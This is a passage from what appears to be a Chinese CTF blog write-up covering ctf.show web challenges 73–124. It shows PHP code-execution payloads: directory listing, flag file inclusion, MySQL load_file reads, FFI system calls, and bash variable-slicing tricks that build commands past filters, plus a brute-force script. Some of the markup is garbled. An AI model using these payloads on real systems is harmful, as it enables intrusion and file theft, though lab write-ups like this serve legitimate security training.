class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web73-1.png"></p><p>​     </p><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>无源码</p><p>查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot;/&quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web74.png"></p><p>打印flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagx.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web74-1.png"></p><p>​     </p><h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>无源码</p><p>查看目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&quot;/&quot;</span>);&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web75.png"></p><p>尝试读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag36.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>好家伙读取不了了</p><p>查看提示，需要使用MySQL的load_file读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh&gt;query(&#x27;selectload_file(&quot;/flag36.txt&quot;)&#x27;)as$row&#123;echo($row[0]).&quot;|&quot;;&#125;$dbh=null;&#125;catch(PDOException$e&#123;echo$e&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>在burpsuite中进行url编码，看操作，payload要将多余的空格删掉才能运行</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web75-1.png"></p><p>​      </p><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>无源码</p><p>查看目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot;/&quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web76.png"></p><p>使用上一把的load_file</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;,&#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh&gt;query(&#x27;selectload_file(&quot;/flag36d.txt&quot;)&#x27;)as$row&#123;echo($row[0]).&quot;|&quot;;&#125;$dbh=null;&#125;catch(PDOException$e&#123;echo$e&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web76-1.png"></p><p>​      </p><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>无源码</p><p>读取目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot;/&quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web77.png"></p><p>题目提到了PHP7.4，有新特性，上网查资料发现 FFI</p><p> <a href="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/PHP7.4%E4%B8%ADFFI%E7%9A%84%E4%BB%8B%E7%BB%8D.html">PHP7.4中FFI的介绍.html</a> </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web77-1.png"></p><p>我们利用新特性读取flag，因为这里flag36x.txt无法显示，所以我们要利用readflag文件，将它重新输入到flag.txt中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;flag.txt&quot;);exit();</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;//没有回显的</span><br><span class="line">$ffi-&gt;system($a);//通过$ffi去调用system函数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>随后访问flag.txt就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web77-2.png"></p><p>​     </p><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>题目提示flag in flag.php</p><p>这样一个页面，输入字符会显示 evil input，经过fuzz测试显示只能大写字母和和${}:?.~ 空格字符可以通过</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-1.png"></p><p>右键查看源码，源码提示system会执行输入的参数</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118.png"></p><p>思路差不多就是利用环境变量拼接，因为 $XXX 是代表变量的意思，那么通过system来执行 $XXX 就会打印该变量的值，例如查询当前工作路径的命令为pwd，而执行echo $PWD 效果一样，$PWD是Linux自带的系统变量，使用env命令可以查看所有系统变量</p><p><strong>方法：</strong>使用echo进行查看</p><ul><li><strong>第一种：</strong>echo $变量名</li><li><strong>第二种(推荐)：</strong>echo ${变量名}</li></ul><p>常见环境变量 <a href="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/linux%E5%B8%B8%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F.html">linux常用系统变量.html</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$0 当前程序的名称</span><br><span class="line">$n 当前程序的第n个参数,n=1,2,…9</span><br><span class="line">$* 当前程序的所有参数(不包括程序本身)</span><br><span class="line">$# 当前程序的参数个数(不包括程序本身)</span><br><span class="line">$$ 当前程序的PID</span><br><span class="line">$@ 与$#相同，但是使用时加引号，并在引号中返回每个参数</span><br><span class="line">$- 显示shell使用的当前选项，与set命令功能相同</span><br><span class="line">$! 执行上一个指令的PID(好像不行?)</span><br><span class="line">$? 执行上一个指令的返回值</span><br><span class="line"></span><br><span class="line">echo $USER      表示当前用户的登录名称，值与whoami命令的结果一致</span><br><span class="line">echo $UID        表示当前用户的用户名，该变量的值与”id-u”命令的结果一致</span><br><span class="line">echo $SHELL     表示当前用户的登录Shell，值与”passwd”文件中的Shell字段一致</span><br><span class="line">echo $HOME   表示当前用户的登录目录（宿主目录），值与”psaawd”文件中home字段一致</span><br><span class="line">echo $PWD    表示用户当前所在的目录，值与pwd命令的结果一致</span><br><span class="line">echo $PATH    表示当前用户的命令搜索路径      </span><br><span class="line">echo $PS1 和echo $PS2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD&#125; </span><br><span class="line">/root    </span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符</span><br><span class="line">/                                                                                                                                                                           </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符</span><br><span class="line">t</span><br><span class="line">                                                                                </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             </span><br><span class="line">t</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH&#125;                            </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">                                                                    </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# echo $&#123;PATH:~A&#125;                </span><br><span class="line">n</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">$PWD和$&#123;PWD&#125;    /var/www/html  --结果一样</span><br><span class="line">$&#123;#PWD&#125;         13    --$PWD的长度</span><br><span class="line">$&#123;PWD:3&#125;        r/www/html   --顺序，从下标为3开始打印</span><br><span class="line">$&#123;PWD:~3&#125;    html  --逆序，从下标为3开始打印</span><br><span class="line">$&#123;PWD:3:1&#125;     r   --顺序，打印下标为3的1个字符</span><br><span class="line">$&#123;PWD:~3:1&#125; h--逆序，打印下标为3的1个字符</span><br><span class="line">$&#123;SHLVL:~A&#125; 1    --A是字符串 转换为数字相当于0 </span><br></pre></td></tr></table></figure><p>这题的思路就是通过环境变量拼接出可以读取flag的命令，例如这样拼接出ls命令</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-4.png" alt="web118-4">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-2.png">    </p><p>我们可以拼接出 nl 命令（当然也可以拼接cat等等）对flag进行读取，nl 命令和cat差不多，可以打印出内容并且带行号。但是题目白名单不包括数字所以只能使用大写字母</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-3.png">    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">只能使用大写字母进行拼接：</span><br><span class="line">$&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">/<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line">所以payload为</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.??? ---nl ????.??</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-5.png"></p><p>源码中找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web118-6.png"></p><p>​      </p><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>操作和上一关一样，但是这一关禁用了PATH变量，那么就不用构造 nl 了，我们构造 /bin/cat 。而想要匹配到我们至少需要一个<code>/</code>符号和一个<code>cat</code>中的一个字母，这里使用<code>$&#123;SHLVL&#125;</code>来配合构造<code>/</code></p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web119-1.png">    </p><blockquote><p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web119-2.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web119.png">    </p><p>所以前半部分就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;? ---/???/?</span><br></pre></td></tr></table></figure><p>现在还需要构造后半部分的 <code>at</code> ，然后一般网站给的权限是 www-data （当前用户）刚好符合我们需要的 <code>at</code>，但是需要我们构造出数字2来去字符，而数字又是被禁用的</p><p>随后发现关卡使用的PHP版本末尾刚好有数字2，要使用到<code>PHP_VERSION</code>变量</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web119-3.png"></p><p>于是后半部分构造为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.??? ---at ????.???</span><br></pre></td></tr></table></figure><p>所以最后的payload(变量$分别替代</p><blockquote><p>$为添加到shell的参数个数，$则为值所以最终payload为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web121.png)在kali中逆向输出一下即可![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web121-1.png)​      ### web122源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>过滤了#号，数字1的话我们没法使用`$<code>了，这里使用</code>$?`，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。过滤了PWD，可以用HOME取 / </p></blockquote><p>下面是一些系统报错返回的数字，通过&lt;A可以使系统报错返回1，而$?刚好接收到这个返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br></pre></td></tr></table></figure><p>最后需要考虑用什么命令来读取文件，这里根据提示使用 /bin/base64 —-/???/?????4</p><p>数字4使用${RANDOM}来获取，因为具有随机性，所以要多次执行，可以使用脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># Author: MTRleed</span></span><br><span class="line"><span class="comment"># file: web122.py</span></span><br><span class="line"><span class="comment"># time: 2023/7/26 14:50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4380918e-2a96-4d50-810b-29148d890943.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">r&#x27;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    result = requests.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;PD9waHA&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web122.png"></p><p>base64解码一下即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web122-1.png"></p><p>​      </p><h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 收集自网络</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>GET方式c传参，长度不能超过80，有黑名单检测。白名单检测，正则匹配字符，全部绕过即可eval命令执行</p><p>使用到的函数<code>base_convert()</code>和<code>getallheaders</code></p><p>主要函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert  #在任意进制之间转换数字。</span><br><span class="line">hexdec  #把十六进制转换为十进制。</span><br><span class="line">dechex #把十进制转换为十六进制。</span><br><span class="line">hex2bin  #把十六进制的字符串转换为ASCII码</span><br></pre></td></tr></table></figure><p>我们需要构造$_GET 把参数逃逸出去</p><p>转成10进制 多转一层绕过过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// 把 hex2bin转化为10进制</span><br><span class="line">echo base_convert(&quot;hex2bin&quot;, 36, 16);   //37907361743</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo base_convert(&quot;8d3746fcf&quot;, 16, 36);  //hex2bin</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//把_GET 先转为16进制再转为10进制</span><br><span class="line">echo 